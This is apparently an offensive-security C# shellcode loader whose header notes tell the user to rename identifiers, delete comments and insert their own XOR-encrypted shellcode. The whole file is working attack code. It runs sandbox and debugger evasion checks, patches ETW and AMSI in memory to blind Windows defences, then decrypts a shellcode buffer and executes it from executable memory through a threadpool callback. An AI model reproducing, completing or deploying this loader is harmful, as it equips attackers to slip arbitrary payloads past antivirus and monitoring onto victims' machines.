/* Important notes: 
- This version is voluntary not obfuscated. Class/function/variable names should be changed and all comments must be deleted or modified before compiling this file.
- Your shellcode must be in C# format and then encrypted using XOR cipher. Obviously, the XOR key must be replaced in this file with the one you used.
*/
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace CsharpShellCodeLoader2
{
	
  class SuperProgram
  {
    
    DllImport("kernel32.dll")]
    public static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);

    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThreadpoolWait(IntPtr callback_function, uint pv, uint pcb);

    [DllImport("kernel32.dll")]
    public static extern void SetThreadpoolWait(IntPtr TP_WAIT_pointer, IntPtr Event_handle, IntPtr pftTimeout);

    [DllImport("kernel32")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscribed, out uint ZygosisCoordination);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr LoadLibrary(string LiodermiaGranulater);
	
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
	
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
	
    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		
    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
    {
        IntPtr FunctionPtr = IntPtr.Zero;
        try
        {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b)
            {
                pExport = OptHeader + 0x60;
            }
            else
            {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++)
            {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch
        {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }
        if (FunctionPtr == IntPtr.Zero)
        {
            // Export not found
            throw new MissingMethodException(ExportName + ", export not found.");
        }
        return FunctionPtr;
    }
	
    public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
    {
        IntPtr hModule = GetLoadedModuleAddress(DLLName);
        if (hModule == IntPtr.Zero)
        {
            throw new DllNotFoundException(DLLName + ", Dll was not found.");
        }
        return GetExportAddress(hModule, FunctionName);
    }
    
    public static IntPtr GetLoadedModuleAddress(string DLLName)
    {
        ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
        foreach (ProcessModule Mod in ProcModules)
        {
            if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
            {
                return Mod.BaseAddress;
            }
        }
        return IntPtr.Zero;
    }
	
    public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
    {
        IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
        return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
    }
    
    public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
    {
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
        return funcDelegate.DynamicInvoke(Parameters);
    }

    private static void PatchETW()
    {
        IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
        IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");
        VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
        var patch = getETWPayload();
        uint oldProtect;

        if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
        {
            Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
            Console.WriteLine("[+] Successfully patched E-T-W (EtwEventSend)");
        }
    }
	
    private static IntPtr getAMSILocation()
    {
        //GetProcAddress
        IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
        IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");
        GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
        LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));
        return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
    }

    private static bool is64Bit()
    {
        if (IntPtr.Size == 4)
            return false;
        return true;
    }
    
    private static byte[] getETWPayload()
    {
        if (!is64Bit())
            return Convert.FromBase64String("whQA");
        return Convert.FromBase64String("ww==");
    }

    private static byte[] getAMSIPayload()
    {
        if (!is64Bit())
            return Convert.FromBase64String("uFcAB4DCGAA=");
        return Convert.FromBase64String("uFcAB4DD");
    }
	
	  private static IntPtr unProtect(IntPtr amsiLibPtr)
    {
        IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");
        VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
        uint newMemSpaceProtection = 0;
        if (fVirtualProtect(amsiLibPtr, (UIntPtr)getAMSIPayload().Length, 0x40, out newMemSpaceProtection))
        {
            return amsiLibPtr;
        }
        else
        {
            return (IntPtr)0;
        }
    }
	
    private static void PathAMSI()
    {
        IntPtr amsiLibPtr = unProtect(getAMSILocation());
        if (amsiLibPtr != (IntPtr)0)
        {
            Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
            Console.WriteLine("[+] Successfully patched A-M-S-I");
        }
        else
        {
            Console.WriteLine("[!] Patching A-M-S-I FAILED");
        }
    }
  
    private static void SandBoxEvasion()
    {
		    Console.WriteLine("[+] Sandbox checks running...");
			
        // Defense evasion: Exit the program if it is running on a computer that is not joined to a domain
        if (string.Equals("WORKGROUP", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase))
        {
			  return;
        }
        
	    	// Defense evasion: Exit the program if after sleeping for 15s, time did not really passed
        DateTime t1 = DateTime.Now;
        Sleep(15000);
        double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
        if (deltaT < 14.5)
        {
            return;
        }
		
        // Defense evasion:  Exit the program if a debugger is attached
        if (System.Diagnostics.Debugger.IsAttached)
        {
            return;
        }
         
        // Defense evasion: Exit the program if making an uncommon API call fails (meaning the AV engine can't emulating it)
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }
		
		 Console.WriteLine("[+] Sucessfully passed sandb0x checks");
	  }
	
    static void Main(string[] args)
    {
		
    Console.WriteLine("** C# ShellCode Loader **");
    SandBoxEvasion();
    PatchETW();
    PathAMSI();	

    //Add your shellcode in C# format encrypted using XOR cipher
    byte[] SuperBuf = new byte[66559] {
    0xac, 0xb2, 0x73, 0x1c, 0xb2, 0x79, 0x1e, 0x0a, 0xb2, 0x79, 0x16, 0xda, 0x12, 0xf5, 0xfa,
    <...SNIP...>
    };
    //Decrypt the shellcode
    for (int i = 0; i < SuperBuf.Length; i++)
    {
      //Edit with your XOR key
      SuperBuf[i] = (byte)((uint)SuperBuf[i] ^ 0xfa);
    }

    string Event_lpname = null;
    IntPtr Event_handle = CreateEvent(IntPtr.Zero, false, true, Event_lpname);
    IntPtr SuperBuf_address = VirtualAlloc(IntPtr.Zero, (UInt32)SuperBuf.Length, 0x1000, 0x40);
    Marshal.Copy(SuperBuf, 0, (SuperBuf_address), SuperBuf.Length);
    IntPtr TP_WAIT_pointer = CreateThreadpoolWait(SuperBuf_address, 0, 0);
    SetThreadpoolWait(TP_WAIT_pointer, Event_handle, IntPtr.Zero);
    WaitForSingleObject(Event_handle, 0xFFFFFFFF);
   
    Console.WriteLine("[+] Shellcode successfully loaded!");
    }
  }
}
